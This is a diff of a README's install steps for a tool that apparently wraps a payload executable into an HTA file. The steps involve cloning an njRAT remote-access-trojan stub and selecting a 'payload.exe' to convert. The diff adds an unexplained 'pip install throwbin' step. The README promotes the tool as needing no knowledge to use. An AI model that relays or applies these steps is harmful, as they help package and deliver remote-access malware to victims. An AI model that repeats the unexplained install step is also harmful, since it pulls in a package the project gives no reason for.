@@ -25,15 +25,16 @@ Video Proof: https://youtu.be/3xzOEhswhnw
 - Easy to use & it doesn't need knowledge
 
 ### 📖 HOW TO INSTALL
-
-1. Donwload & install python3 ('https://www.python.org/downloads/')
-2. Download 'njRAT C# Stub' from github ('git clone https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp')
-2. Download the tool
-3. Unzip the file
-4. Open the EXETOHTA.exe file
-4. Select your python.exe path
-5. Select your payload.exe path
-6. press CONVERT button.
+IMPORTANT! pip install throwbin
+1. pip install -r requirements.txt
+2. Donwload & install python3 ('https://www.python.org/downloads/')
+3. Download 'njRAT C# Stub' from github ('git clone https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp')
+4. Download the tool
+5. Unzip the file
+6. Open the EXETOHTA.exe file
+7. Select your python.exe path
+8. Select your payload.exe path
+9. press CONVERT button.
 
 To learn more please watch this video: https://youtu.be/3xzOEhswhnw
 
